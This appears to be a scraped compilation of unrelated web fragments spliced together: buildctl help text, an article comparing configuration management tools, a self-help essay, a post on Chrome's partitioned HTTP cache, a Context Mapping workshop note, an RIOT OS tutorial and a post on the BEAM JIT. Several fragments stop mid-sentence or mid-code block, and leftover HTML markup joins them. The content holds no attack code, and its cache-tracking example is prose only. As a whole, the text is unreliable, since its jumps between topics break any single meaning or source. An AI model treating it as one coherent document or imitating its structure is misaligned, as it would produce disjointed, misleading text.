<p>Now let's start a build, passing in the shrink-wrapped location as the build-context. The command we want is <code>buildctl</code>, buildctl is a client for the daemon and will configure how to build the image and what to do when it's done, such as exporting a tar, ignoring the build or pushing it to a registry.</p>
<pre><code>buildctl build --help
NAME:
   buildctl build - build

USAGE:
   
  To build and push an image using Dockerfile:
    $ buildctl build --frontend dockerfile.v0 --opt target=foo --opt build-arg:foo=bar --local context=. --local dockerfile=. --output type=image,name=docker.io/username/image,push=true
  

OPTIONS:
   --output value, -o value  Define exports for build result, e.g. --output type=image,name=docker.io/username/image,push=true
   --progress value          Set type of progress (auto, plain, tty). Use plain to show container output (default: "auto")
   --trace value             Path to trace file. Defaults to no tracing.
   --local value             Allow build access to the local directory
   --frontend value          Define frontend used for build
   --opt value               Define custom options for frontend, e.g. --opt target=foo --opt build-arg:foo=bar

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>In this article, you’ll learn the basics of Configuration Management tools so
that you can decide which one you need. Whether you’re looking to automate
your infrastructure management or are just browsing for future reference,
you’ll walk away with a handful of useful takeaways and insights.</p>
<p>We’ll start with what configuration management is and what it’s used for. Once
you understand its application, we’ll compare a few existing configuration
management tools and discuss their differences and overlapping features.</p>
<h2 id="what-is-configuration-management">What is Configuration Management?</h2>
<p><strong>Configuration Management (CM)</strong> is a systems engineering process that allows
you to configure your infrastructure and automate many tasks.</p>
<p>Traditionally, system administrators used to run scripts in batches to
configure new environments and keep them in the desired state. This intricate
process required manual documentation of every change, so human error was not
uncommon.</p>
<p>Then CM came into the picture. Think of it as an up-to-date inventory for all
of your assets, which include:</p>
<ul>
<li>Databases</li>
<li>Applications</li>
<li>Shared cache servers</li>
<li>A load balancer</li>
<li>Monitoring tools</li>
</ul>
<p>Now think about all of the config files on these servers (ini, xml, conf,
yaml). What about the packages, dependencies, and third-party libraries that
each server might require?</p>
<p>What if there was a tool that could aggregate all of that configuration, wrap
it around a central config file and always stay vigilant of any changes?</p>
<p>In the last decade, a plethora of configuration management tools hit the
software space. Tools like Ansible, Puppet, Salt, Chef, Terraform and many
more offer a wide range of capabilities to ease your infrastructure
development.</p>
<p>While they have many overlapping features, each software offers a unique set
of tools.</p>
<h2 id="why-is-configuration-management-important">Why is Configuration Management important?</h2>
<p>In the era of microservices, we shouldn’t configure each service manually:
it’s time-consuming and prone to human error. <strong>Configuration management
allows you to centralize and automate your infrastructure configuration.</strong></p>
<p>An average web application has at least one database, a shared cache server,
and a few web app instances. When scaling horizontally, it’s critical to be
able to change configuration quickly and revert in the case of disaster.</p>
<p>To minimize user impact, the architecture should be resilient and immune to
any outages.</p>
<p>CM enables you to tame your infrastructure, reduce operation costs and cut
downtime. Think of configuration management as an architectural framework of a
house - it provides a strong base for streamlined development.</p>
<h2 id="main-benefits-of-configuration-management">Main benefits of Configuration Management</h2>
<p><strong>Organization.</strong> Instead of piecing together scattered scripts, store your
configurations in a central location. This prevents firefighting and
unnecessary downtime. Controlling your entire infrastructure from one place
enables effective collaboration between teams. CM turns the most cumbersome
infrastructures into flexible architectures. It tracks changes, monitors
performance, and enforces consistency.</p>
<p><strong>Cost efficiency.</strong> Reduce the risk of security breaches by tracking
architectural changes. Cut costs by quickly scaling down when possible. CM
allows you to avoid wasteful duplication and eliminate redundant assets in
your cluster. Automating configuration can save you time and effort as your
architecture grows. Focus on infrastructure improvement, not maintenance.</p>
<p><strong>Rapid environment deployment.</strong> Repeatable configurations let you whip up a
sandbox cluster in a matter of minutes. Test new configuration updates and
roll them out in an incremental fashion without worrying about breaking
something.</p>
<p><strong>Stable infrastructure development.</strong> Infrastructure as Code (IaC) allows for
incremental and trackable updates to your infrastructure. Set up robust
environments with just a few lines of declarative code. Track your
infrastructure changes as part of the Software Development Life Cycle (SDLC)
to keep your system agile and your users happy.</p>
<p><strong>Hand a chunk of operations work to developers.</strong> By definition, development
seeks change while operations strives for stability. Even though DevOps merges
these two IT branches and helps to balance out their conflicting interests,
letting developers have control over their own architecture will only
streamline the overall development.</p>

<p>Now that we’ve discussed the software Configuration Management (CM) concept,
let’s clarify the idea of CM tools.</p>
<p>These are the tools that ensure consistency across the cluster of physical and
logical assets. Designed to automate the deployment, they facilitate
continuous integration and handle resource management across your
infrastructure.</p>
<p>Back in the day, manual configuration management was fraught with risks like
disruptions to application availability and data corruption. To alleviate
these, sysadmins strived to automate as many processes as possible by writing
scripts and executing them in batches. This is what led to the rise of
Configuration Management tools.</p>
<p>The first versions of major CM tools came out in the early 2000s. They mainly
relied on an imperative approach of running batch scripts to bring
environments to the desired state.</p>
<p>Within a decade, CM tools evolved into automation wizards and orchestration
maestros. Batch scripts have now been organized into a set of configuration
files that can spin up the entire environment with a simple keystroke.</p>

<p>The variety of CM tools can overwhelm even the most experienced sysadmin. To
pick the tool that’s right for you, consider the following:</p>
<p><strong>The community behind the technology.</strong> More established and mature
technologies seem to have a larger community of supporters. If you don’t plan
on buying enterprise support, this factor is essential - it might be your last
and the only line of defense when you run into problems. Although older
technologies might appear more mature and time-proven, they tend to be more
cumbersome.</p>
<p><strong>Purpose.</strong> How many existing systems will the CM tool need to configure and
integrate with? Will most of your environments serve operations or development
purposes? A system designed for operations staff will differ from one designed
for developers.</p>
<p><strong>Deployment frequency.</strong> Are you an agile development team that needs to ship
out changes several times a week? Or do you have more established applications
that require stability?</p>
<p><strong>User-friendly interface.</strong> Consider how comfortable your team members are
with Linux and the command line. Do they need a rich Graphical User Interface
or are they fine with a bare-bone terminal? What previous technologies have
they worked with?</p>
<p><strong>Organizational size.</strong> If your organization is large and has a complex
network of applications, choose a CM tool more conservatively. A mature,
widely-supported and highly secure product like Ansible would be the top
choice. It has a proven track record and a wide community of supporters.</p>
<p>There are many CM tools out there. However, as this is just an introduction to
configuration management, we’ll limit our choices to the few that stand out
the most (in our humble opinion).</p>

<p>Many CM tools have overlapping features, but each stands out in its own
special way. We’ll list the most prominent ones here to help you make the
right decision.</p>
<h3 id="ansible">Ansible</h3>
<p>With a market share of 27%, Red Hat’s <a href="https://www.ansible.com/" title="Red Hat's Ansible home page">Ansible</a> has the biggest community to
help you propel your development in times of architectural adversity. Being
the most versatile CM tool on the market, Ansible is trusted by Intel,
Atlassian, Cisco, Twitter, Verizon, and even NASA.</p>
<p>Best suited for automation, deployment and provisioning, this hefty CM tool
can handle the most complex IT workflows. Many benefits of Ansible make it the
top choice not only for large enterprises, but also for small organizations
and even startups.</p>
<p><strong>Agentless.</strong> Ansible’s push-based configuration approach leaves more
resources for your applications or simply allows you to remain lightweight.
The control node securely provisions all of its managed nodes or hosts through
SSH and doesn’t need to run any agents on remote servers. This makes it
convenient to add existing resources under configuration management.</p>
<p><strong>Readable syntax.</strong> Ansible’s Domain Specific Language is based on YAML and
is extended with templating ability. It lets you parameterize your playbooks
and keep sensitive data out of plain-text configuration until it hits its
final destination. The inventory file, which is used by Ansible as a map to
the infrastructure, can use a syntax similar to that of “ini”. However,
ini-style inventory is really only suitable for small scale deployments and
hello world demos. In all other use cases, we would probably use one either
YAML format or dynamic inventory.</p>
<p><strong>Wide selection of modules.</strong> When you install Ansible community edition, you
get access to over 4,000 modules that let you network with Windows and Linux
servers. If you ever need additional functionality, one of these modules most
likely offers it already.</p>
<p><strong>Reusability.</strong> Ansible can run your existing shell scripts so that you won’t
have to rewrite them. If you already have a semi-automated architecture,
Ansible can streamline your configuration management.</p>
<p><strong>Free.</strong> Ansible is an open-source and free software backed by a large
community. Many forums, stack overflow threads, and descriptive documentation
will always be within your reach should you run into any problems along your
configuration journey.</p>
<p>If you want to get up and running quickly while still ensuring consistency and
reliability, there is a big chance that Ansible could be your tool.</p>
<h3 id="puppet">Puppet</h3>
<p>Before Ansible hit the market a little less than a decade ago, <a href="https://puppet.com/" title="Puppet's home page">Puppet</a> was
the king of configuration management.</p>
<p>Unlike Ansible, Puppet takes a master-agent approach, requiring an agent on
every managed node. The master stores the code to define the desired state of
the entire infrastructure and delivers the individual configuration catalogs
to each agent. The node then brings itself to the desired state by applying
the configuration shipped from the master node.</p>
<p>It’s worth mentioning that …</p></div></div>

    </p>

        <p>I was raised in an impeccably positive household. I never heard anybody putting someone down. I never heard complaints about someone being more well-off or arguments about mistrust or misunderstanding. Smiling, complimenting, helping others and ultimately, having good intentions was a vital baseline for the <a href="https://www.youtube.com/watch?v=q6f-w9kJhuk" rel="noopener noreferrer" target="_blank">principles that I lived by</a>, growing up.</p>
<p>Despite this making up the foundations, who I am today isn’t defined by those past teachings. In my beginnings of adulthood, pernicious influences and dark natured experiences began to seep into a properly-maintained mental fortress. Like a tornado devastating the brickwork, <a href="https://www.youtube.com/watch?v=q6f-w9kJhuk" rel="noopener noreferrer" target="_blank">my truths and principles</a> were collapsing.</p>
<p>Following the disastrous events, I could not rebuild my conceptual fortitude with the same positive and frankly, innocent angle I once obtained. I found myself constructing <a href="https://www.youtube.com/watch?v=q6f-w9kJhuk" rel="noopener noreferrer" target="_blank">my worldview</a> with a new, darker outlook with hard-hitting truths that I explored brick, by brick…</p>
<h2>I. You can’t control the temperamental dispositions of those around you.</h2>
<blockquote>
<p>‘Treat others how you wish to be treated, and in turn, they will treat you the same.’</p>
</blockquote>
<p>If you’ve heard this line uttered, it’s probably due to an unexpected influence within history. Although your life may not have any direct bearing on religion, the story of Jesus inspired many, <em>indirectly</em>, to implement the nature of good-will. <em>‘What goes around, comes around’</em> is another phrase that stems from this same influence.</p>
<p>But this is simply not the case with humans. There are far too many variables that can take place in one life for you to be able to predict or even <em>expect</em>, good-will to ever be returned.</p>
<p>People are lazy. But understandably so. Our modern life demands us to be <a href="https://journal.thriveglobal.com/what-i-learned-from-eating-alone-at-a-restaurant-9dbede27751c" rel="noopener noreferrer" target="_blank">focused on the day-to-day</a> and unfortunately, ourselves. We are demanded to make something of/for ourselves and to protect it at all costs before <a href="https://journal.thriveglobal.com/5-skills-that-will-give-you-an-advantage-over-the-competition-51280b7deaac" rel="noopener noreferrer" target="_blank">it’s taken from us by the competition.</a> There is very little time to be fanatical about others when they spend such little time doing exactly that.</p>
<p>Nevertheless, there are outliers. There are individuals who <em>choose</em> to act on helping others, maintaining a positive and compassionate outlook and care for those around them._ These people should not be taken lightly. _They place effort in doing this, even if they believe that it comes to them effortlessly. They have subconsciously chosen to go against the common mindset and do what is in their power, to serve those that need it most: other humans.</p>
<p>Understanding this can give you the ability to spot these outliers, and can internally inspire yourself to behave in this way also. Acting without expectations, serving without demands and caring without want for the same can make way for an unstoppable character, filled with unlimited energy.</p>
<h2>II. You can be easily labelled by the majority.</h2>
<p>You: as an individual, actually have very little power in the ability to define your individuality. Labels and personality expectations are set by those who you do not know personally. As you mature, you start deciding your stance of certain beliefs and the position in which you choose to place yourself in society. But outside sources will categories these intricate and specific decisions and give others permission to believe they understand all of your perspective without having to query deeper.</p>
<p>In loss of hope, you will succumb to the majority and grant permission for the instant gratification of popular acceptance to take place. You will not truly feel yourself, but you will immediately feel like you belong. Deep down however, you know this doesn’t quite sit right. <a href="https://medium.com/@JustinCampbellP/a-small-moment-that-saved-a-relationship-453677ccc6ab" rel="noopener noreferrer" target="_blank">You desire close relationships</a> to talk through <a href="https://journal.thriveglobal.com/what-i-learned-from-eating-alone-at-a-restaurant-9dbede27751c" rel="noopener noreferrer" target="_blank">psychological obstacles</a> and inventive ideas; something you cannot get by conforming to group mentality.</p>
<p><a href="http://amzn.to/2fYgeMc" rel="noopener noreferrer" target="_blank">Marcus Aurelius</a> once said <em>‘The object of life is not to be on the side of the majority, but to escape finding oneself in the ranks of the insane.’</em> Be unique. Fight for your own right to be an individual and do not allow others to negatively undermine or label your own personal beliefs and life decisions. Its a long and hard battle, but the mental clarity and deep connections you will make with those who align with and <em>truly</em> understand you is worth every fight.</p>
<h2>III. People will try to gain power over you and manipulate you.</h2>
<p>A side-effect that comes from years of believing that the world is simply full of good intentions and <a href="https://medium.com/@JustinCampbellP/a-small-moment-that-saved-a-relationship-453677ccc6ab" rel="noopener noreferrer" target="_blank">compassionate people</a>, is being incredibly vulnerable to those who wish to harm you. You can misplace trust in those who aren’t to be trusted and you can become an addict to those who sound commanding. Learning about the truth of these characters can be a hard pill to swallow.</p>
<p>To many, power is a goal and an approach which they practice on countless situations. They seek to destroy your good intentions, look for your weaknesses and court to them to gain power over your decisions. However, these actions of manipulation can often be rationally understood. As <a href="http://amzn.to/2fXGczu" rel="noopener noreferrer" target="_blank">Niccolò Machiavelli</a> once put it: <em>‘Men are driven by two principal impulses, either by love or by fear.’</em> Many of those who seek to harm you, are inspired out of fear. Your display of content or confidence in approach to life can intimidate those who lack that similar attitude. The fear of losing stature or relationships through exposure of their ill-means drives them to, rather than improve themselves, control and put down those who display anything they lack.</p>
<p><a href="https://journal.thriveglobal.com/what-i-learned-from-eating-alone-at-a-restaurant-9dbede27751c" rel="noopener noreferrer" target="_blank">Know thy self. Know your weaknesses and let nothing move you.</a> You must master your own domain and be aware of where you can be targeted. Becoming comfortable with exposure is a masterful way of avoiding the control others seek to employ over you. You must seek solace in knowing yourself, <a href="https://journal.thriveglobal.com/5-skills-that-will-give-you-an-advantage-over-the-competition-51280b7deaac" rel="noopener noreferrer" target="_blank">pushing your abilities to their limits</a> and recognising that your flaws only allow your strengths to flourish.</p>
<h2>IV. You believe your own lies.</h2>
<p>The mind has an interesting control over itself. Convincing it that something was to be true, does not take much action. To lie, on several occasions, the same lie is one crippling way for you to invent a new truth for it to succumb to. Think of yourself rewriting over pages that had already been written and re-publishing that book; only to then destroy the original copy.</p>
<p>Although this is a foolish and often quite dangerous way to approach situations, this can actually be used to your own advantage. Horace once said <em>‘Rule your mind or it will rule you.’</em> Use this blinding technique to tell yourself the lie that <em>you’re better than you already are</em>. In doing so, you have already begun the path to believing the lie and living it. Your new life tied to this lie, will start to feel more desirable. Your decisions you make from then onward will serve this lie; which, in time, will transform into your new <em>truth</em>.</p>
<h2>V. There is no ‘one thing’ to improve.</h2>
<p>Self-improvement is an idealised approach that many people undergo. They seek shortcuts and hacks to evolve dramatically. Often they go looking for answers but look to external sources when doing so.</p>
<p>In your lifelong journey, you can be swayed by so-called ‘smarter’ people who have all the unlocks and keys to how you need to go about ‘succeeding’ in the world. Don’t be tempted by their apparent secrets. All the information you will ever need is out there. In the people you meet, and in the experiences you go about.</p>
<p>Reflection, self-awareness and a certain degree of persistent investigating is all you need. You must use all these constantly, with a high-level of self-discipline to win at your life. Notice the word I chose to use: ‘<em>your</em>’. This is your life and what success and improvement mean are chosen by you. It will be a long and uphill battle that you must fight with all your might; but fear not, the reward of unexpected, new ways of thinking and a pronounced contentment will make the fight — very much worth it.</p>
<h2>VI. You have an addictive nature.</h2>
<p>Humans are habitual creatures. You thrive off routine and your life spins on a cycle which you gracefully accept. These habits are inspired by simple actions, but they quickly lead to major behaviours which can impact your life decisions. If you allow yourself to taste one behaviour, your addictive nature can takeover, clouding both logic and reason.</p>
<p>There is no choice as to whether you can be addicted or not. _You have an addictive nature. _The only variable you have is <a href="https://medium.com/@JustinCampbellP/i-deleted-my-social-media-apps-heres-why-20f3807a6b38" rel="noopener noreferrer" target="_blank">choosing _what _you are addicted to.</a> Seek out behaviours and lifestyle choices that you feel will make you a better person and choose to become addicted to those things.</p>
<h2>VII. You are a very small person, in a very large world.</h2>
<p>This is a scary thought that you can never be free from. The world around you is almighty. Its overwhelming number of species, societies, cultures, decisions, land and open waters can be a beauty to marvel at; but can also be a powerfully belittling feeling.</p>
<p>You are small and insignificant in the broader aspect of nature. You choose to allow this to target your self-confidence and belonging in this world. You are free and as so, you have the right to explore this vast and incredible world. There is so much to see, hear, feel, taste and experience.</p>
<p><em>‘Belie your national defects.’ </em><a href="http://amzn.to/2yMKBc1" rel="noopener noreferrer" target="_blank">Baltasar Gracian</a> advises an unparalleled tactic. You must learn to become internationally fluid. Do not accept the norms of your given society and do not conform to the idea of blind patriotism if you have yet to see what else is out there. The old saying goes ‘<em>we fear most what we don’t understand</em>’. Well, place yourself in _culture shock and a_llow the world to teach you what it is that you don’t understand.</p>
<h2>VIII. You are alone.</h2>
<p>In your fight for freedom and true love for life, you must realise that you are alone in your fight. No one has any vested interest in doing everything for you, which is especially the case if you yourself are not investing all your energy in this battle. The dark fact is, even those closest to you can only do so much to help you, for everyone has their own demons in which they have to spend some time …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When I started doing web development, we all loaded jQuery from the official global jQuery CDN.</p><p>The idea was straightforward: if everybody loads the same jQuery script file (<code>cdn.jquery.com/jquery.latest.js</code> – or whatever URL it was back then), then the script file would be cached by the browsers, and other sites requesting the same script would benefit from the speedup of already cached resources. Users would have popular libraries like jQuery already sitting in their browser cache because earlier visited sites requested them.</p><p>This caching behavior was possible because, at the time, the browser's HTTP caches used the asset URL (<code>cdn.jquery.com/jquery.latest.js</code>) as a single cache key. Browsers use cache keys to figure out if and how to cache a resource. If these keys only consist of the resource URL, it allows the reuse of resources across sites and domains.</p><p>All this worked great, but as it is with many great inventions in web technology, <strong>cross-site resource caching enabled new ways to track users across different sites</strong>.</p><p>As an example, let's assume Facebook loads a unique file in their logged-in area (<code>fb-logo-ajgdmaks839–as.svg</code> – I totally made that file path up); if I would know the file path to such a file, request it on <code>stefanjudis.com</code> and see a rapid response coming from the browser cache, I can almost be sure that the user has logged into Facebook lately.</p><h2 id="new-http-cache-keys-in-google-chrome"><a href="#new-http-cache-keys-in-google-chrome">#</a> New HTTP cache keys in Google Chrome</h2><p><a href="https://bugs.webkit.org/show_bug.cgi?id=110269">Webkit (Safari) changed its caching strategy already in 2013</a> to prevent user tracking via the browser cache. Its cache keys are a combination of the requested resource URL and the top-level-domain requesting the resource.</p><p><em>☝️ Big thanks to <a href="https://twitter.com/tomayac/status/1317861511784792067?s=20">Thomas Steiner who gave input on that matter</a>.</em></p><p>On the bright side, this key structure prevents the mentioned tracking possibilities; unfortunately, it also leads to duplicated resources in the browser cache.</p><p>And... it hinders third-party resource sharing across the internet.</p><pre><code>Browsers duplicate resources with different keys:

cdn.jquery.com/jquery.latest.js-amazon.co.uk
cdn.jquery.com/jquery.latest.js-www.stefanjudis.com
</code></pre><p>Starting with v86, Chrome will be using combined cache keys, too. This change means that it's time to say goodbye to third-party resource-sharing across the web. <a href="https://www.statista.com/statistics/544400/market-share-of-internet-browsers-desktop/">With Chrome's market share of roughly 70%</a>, most browsers hitting our sites will use partitioned browser caches from now on. Chrome went for combining the top-level site URL, the current frame site URL, and the resource URL. This approach is more granular than what Safari does, but the result is the same.</p><p>If your sites request the global jQuery, modules from <a href="https://unpkg.com/">unpkg.com</a>, font files from <a href="https://fonts.google.com/">Google fonts</a> or GA's (Google Analytics) <code>analytics.js</code>, <strong>users will redownload the resources no matter if they downloaded and cached them for other sites already.</strong></p><p>What does this change mean for you? If your sites live on modern hosting that provides a CDN and supports HTTP/2, you can drop the third-parties and should ship all resources yourself. Relying on a third-party provides little value in 2020.</p><p>I have mixed feelings about these changes. It's excellent that browsers consider privacy, but it looks like anything can be misused for tracking purposes these days.

		<div data-page-title="Diverge and converge to create a Context Map – Another look on tech" data-image="">

<section>

	<div>

		<p>Context Map was the first visualisation for the Bounded Context pattern from Domain-Driven Design. In a nutshell, it is a map of the different Bounded Contexts and their relationships. I tend to create a Context Map during or after a Big Picture EventStorming. Changing perspectives can be helpful, to challenge assumptions and get the best of different techniques.</p>

<p>However, sometimes it is hard to reach a consensus on the Context Map. I often operate in brownfield projects, with large organisations. Although people agree with the different bounded contexts, it is a process that takes time, and most significant energy. Which can lead to fatigue towards the method, and at the same time raises exciting patterns in the behaviours. But this blog post is not about emergent behaviour. :)</p>

<p>To tackle it, and inspired by the <a href="https://www.seanvantyne.com/2017/02/19/design-thinking-divergence-convergence-cycles/">Divergence and Convergence cycles</a> from Design Thinking, I start to apply the same pattern to my Context Mapping workshops. After a Big Picture EventStorming, I give the theory about Bounded Contexts and Context Mapping. You can find useful resources from the <a href="https://github.com/ddd-crew/context-mapping">DDD Crew</a>.</p>

<p>I split the group into small groups of 3 to 4 people. Each group needs to create a Context Map for their domain, using the output of the EventStorming. As they generate insights, they challenge the EventStorming, documenting it. We can have several rounds, timeboxed (the wonders of timeboxing). After that, each group do a show and tell about their reasoning and thought process. People can ask questions, challenging their model. As the process goes, we collect these questions and ideas. This is what I call the diverge phase. Each group creates their own version of the Context Map, but because the discussion is in small groups, it can be more effective.</p>

<p>The next phase is to start to converge. I ask one person to volunteer and to get all the bounded contexts from the different groups that are the <em>same</em>. In this case, we can get 50% to 80% of the Context Map done, with the advantage that is the part that people agree with each other. It avoids the fatigue of rehashing discussions. The next step in this phase is to start to decide on the “leftovers”, each needs more time to discuss. From my experience, this step is the most interesting one, because people have their own mental models about the bounded contexts. Focusing the energy to discuss the differences and trade-offs of the boundaries leads to a better outcome, and I can guide people over the discussion on the boundaries of the more complicated and complex problems. This last step can take a few hours, or a few sessions over time, depending on the size of the domain. As a rule of thumbs, I tend to split over multiple sessions, to allow people to think about it. Some of the best ideas happen in the shower!</p>

<p>You may ask if it is useful both physically and remotely. And the answer is yes. Physically you need more modelling space, where groups can discuss but not bias each other. Online you need tools that allow people to be isolated in their own room. In the end, it will produce the same output.</p>

<p>I’m wondering about your experiences. How do you get consensus over a Context Map?</p>

                    <p>All of us have used Operating Systems like Windows, Mac or a Linux distribution. I am sure you have wondered about the efforts that must have gone into implementing a system like this or maybe thought, "Oh I wish I could improve this, but how do I start with even understanding such a complex system". I have good news for you; after reading this blog, you will have a starting point to OS development.</p><h3 id="motivation">Motivation</h3><p>OS development in itself sounds a nice and cool but it seems so difficult at first. I realised how fun it is after working on my thesis to develop a complete network stack for an OS. </p><p>I found OS development has the following advantages with :</p><ol><li>Become proficient in low-level languages like C</li><li>Practical applications of theory for those who have taken courses like OS and faster grasping of concepts for others</li></ol><p>These are just a few from the top of my mind, but a fair warning, you probably won't be able to improve to Windows anyways for apparent reasons. </p><h3 id="prerequisites">Prerequisites</h3><p>The purpose of this blog is to inspire more people to start OS development regardless of their conceptual understanding of complex operating systems. However, it is better if you have preliminary knowledge of the following:</p><ul><li>Compiling and Running C code with features like <a href="https://www.programiz.com/c-programming/c-preprocessor-macros">macros</a> (preprocessing directives to make code smaller and more generic)</li><li><a href="https://www.tutorialspoint.com/makefile/index.htm">Makefile</a> (a build automation tool to compile your code automatically with the set of rules defined in the file)</li><li>GitHub</li></ul><h2 id="theory">Theory</h2><p>Before we go into the details of Operating Systems and their development, let me give a brief introduction to <strong>Process Scheduling</strong>. Readers who know this concept can skip this section.</p><p>Every task sent from one of the programs to the Processing Unit of the Computer has two major components, namely, IO and CPU parts. After doing the CPU part of the task, the CPU would essentially be ideal; therefore, to improve the overall efficiency, a scheduler is present to schedule the tasks as they come. In layman's terms, it decides what process will run on the CPU at a particular point in time. This part of the OS is called a process scheduler. The figure below shows an example of a simple process scheduler.</p><figure><img src="https://blog.bitsacm.in/content/images/2020/09/image-5.png"><figcaption>Process scheduler [3]</figcaption></figure><p>You can read more on this <a href="https://www.tutorialspoint.com/operating_system/os_processes.htm">blog</a>.</p><h2 id="operating-systems">Operating Systems</h2><p>The operating systems, as we know today, are way too complicated as beginners to work on, especially with the limited knowledge we have from our undergrad courses like Operating Systems, Computer Networks and DSA. Therefore here, I will introduce you to Operating Systems designed for low power embedded systems called <a href="https://en.wikipedia.org/wiki/Real-time_operating_system">Real-Time Operating Systems</a> (RTOS). Since the OS runs on hardware with limited resources(low memory and power), it has a reasonably simple construct which in-turn makes understanding the code and contributing to it much more manageable. For example, these operating systems do not need complex process schedulers due to the relative simplicity of the applications running on them. </p><p>In this blog, I will be talking about<a href="https://www.riot-os.org/"> RIOT OS</a>, which is a developing, Open-source RTOS.</p><h2 id="riot-os">RIOT OS</h2><figure><img src="https://blog.bitsacm.in/content/images/2020/09/riot-1.png"></figure><p>The most salient features of this operating system are:</p><ol><li>Can run on hardware with RAM and ROM as low as 1.5kB and 5kB respectively!</li><li>Support to over 100 different embedded device boards which makes it highly versatile and generic</li><li>Minimal hardware-dependent code</li><li>Code on Linux or Mac OS <a href="https://doc.riot-os.org/group__boards__native.html">natively</a>(explained later in the blog), deploy on embedded device</li><li>Highly active community with ~25 commits every day</li><li>Highly experienced people working on development, researchers from renowned Universities in France and Germany, so they know what they are doing</li><li>Conducive and active contributor community, hence providing a nurturing environment for new contributors</li><li>The best, its <strong>Open-Source</strong>, so you can modify the code for free and even contribute to it</li></ol><p>So, now let's delve into the operating system with a small introduction to the OS itself and then I will show you how to run a user application on the OS designed for IoT devices.</p><h3 id="riot-os-structure">RIOT OS Structure</h3><figure><img src="https://lh4.googleusercontent.com/BuhvNw7PM8jAGLsf_EFgVheuFhkmIzEgCdam8ee9u2VoS3uogk1jokvm-SOAxSkszNPbOXQeS534YbxT0H72jC7qz9YDglhyMt41hgI3z00YGIz68K-e9K8DlkFhGjnJ4W2ANu2Y"><figcaption>RIOT Structure [2]</figcaption></figure><p>The Image above gives an overview of RIOT structure which shows that RIOT OS, like any other RTOS, is logically divided into the following categories:</p><ul><li>Core/kernel: Implements the basic data structures and heart of the OS</li><li>Hardware: Implements the abstraction to interact with a micro-controller, hardware devices like radio devices, sensors, etc. The component includes CPU specific implementations, configuration for different boards which use those CPUs, supporting peripheral implementations like real-time clocks and drivers of various sensors.</li><li>System functionalities: Implements system libraries which are not part of the basic kernel like networking and file system</li><li>Packages: Implements support for all additional external libraries which are not a part of OS code</li><li>Applications: Implements high-level logic for use in actual applications.</li></ul><p>Don't worry if you don't exactly get what each component gets just yet. You will understand it as you work your way into the code and reach the registers on the micro-controller.</p><p>The user applications in RTOS are compiled and directly linked with the Operating System's code into one binary. This helps reducing final binary size, which is beneficial since the MCUs have low memory. This feature is in contrast to our traditional operating systems where we can run the application on top of the OS.</p><p>Now, the next question that comes to mind is that as a software developer how could you work on an Operating System that runs on separate hardware(micro-controller) which you may not want to buy (at least initially). RIOT developers have an excellent solution for this which simulates the hardware to run on your PC natively(more on this when we go through the example later in the blog). Also, there is an open-source test-bed on which one can openly deploy their code for testing at <a href="https://www.iot-lab.info/">FIT IoT-Lab</a>.</p><p>Another fantastic thing about the operating system is how the code design and the build system work together to make each module easily swappable. For example, if the user application only needs the shell, they only need to include the module corresponding to shell in the user application Makefile.</p><p>RIOT OS has <em>tickless priority-based</em> scheduler. It is a very primitive scheduler where the scheduler does not schedule processes according to time spent by the process on CPU. Instead, schedules processes according to the processes' priority. For example, the scheduler will schedule the process with lower priority (say, priority 5) only after all the higher priority processes(processes with priority 1-4) have finished executing. Such a primitive scheduler is there to reduce the complexity of the final system again due to limited computing resources (low computing power of the MCU). If you are interested to know more about how priority scheduling works, you can watch the <a href="https://youtu.be/cNdEQKw4apM">video</a>.</p><h3 id="default-example-of-riot">Default Example of RIOT</h3><h4 id="setting-up-your-pc">Setting up your PC</h4><p>So, the first task would be to get your pc ready to compile, flash (on an external hardware board, if any) and run the operating system. For this, you can follow the Tutorials provided on their website <a href="https://github.com/RIOT-OS/Tutorials/blob/master/README.md">[1]</a>. You would be installing essential tools like <code>git</code>, <code>make</code>, <code>gcc</code>, <code>openocd</code> (an open-source tool for debugging and flashing micro-controllers) and a <code>cross-compiler</code> which works with <code>gcc</code> to compile the code for arm based embedded devices.</p><h4 id="example-explained">Example explained</h4><p>After installing all the dependencies and cloning OS code from GitHub, you should go to the <code>./examples/default</code> directory in the riot folder which is a primitive example of application code running on the OS. We will use this default example as a reference in this blog. All the folders inside the examples folder represent example user applications running on the OS. There are two main components here, namely <code>main.c</code> and <code>Makefile</code>. The <code>main.c</code> file contains user application code. The <code>Makefile</code> is a file with some set of directives(rules stating to include some particular modules of the operating system) utilising make build tool(this tool essentially automates the compilation process) to generate the final binary.</p><figure><pre><code>#include "thread.h"

        <small>2020-10-26</small>
        <p>The BEAM is the virtual machine that Erlang and Elixir runs on. It is widely cited as a battle-tested piece of software though I don’t know in which wars it has seen action. It has definitely paid its dues in the telecom space as well as globally scaled projects such as Whatsapp and Discord. It is well suited to tackle soft-realtime distributed systems with heavy concurrency. It has been a good platform chugging along. And with a small team at Ericsson responsible for much of its continuing development it has been managed in a deeply pragmatic way. Erlang has always been a bit of a secret and silent success. Almost no-one uses it if you look at market shares. But among the ones that use it there seems to be a very positive consensus. And then Elixir came and caused a bit of a boom. I think the BEAM has benefited from Elixir and Elixir wouldn’t exist without the BEAM. With that bit of background I’d like to shine a light on some cool developments that I think makes the BEAM more interesting or even uniquely interesting in the future.</p>
<h2 id="the-jit-is-here-soon-otp-24">The JIT is here (soon, OTP 24)</h2>
<p>With OTP 24 landing sometime next year we are going to get the a JIT for the BEAM. Based on the project <a href="https://github.com/asmjit/asmjit">AsmJit</a> this will mean that some BEAM code will be translated to native instructions. It will not be the kind of warm-up-for-performance-gains JIT that I’ve heard of in PyPy but rather significantly simpler. The goal of the project was to introduce a JIT that could give performance gains for some cases but would not cause any performance regressions. A pragmatic and laudable approach. Considering this made the Jason JSON-library (written in Elixir) beat the Jiffy JSON-library (written as a C NIF) in <strong>some</strong> tests I think this has the potential to obviate the need for some NIF implementations. Avoiding reaching out to the lower level code that is more capable but more dangerous is a good win.</p>
<p>Anyone running RabbitMQ should look forward to the update as measurements indicate 30-50% increased message throughput. Which is a nice thing to get for no code changes at all.</p>
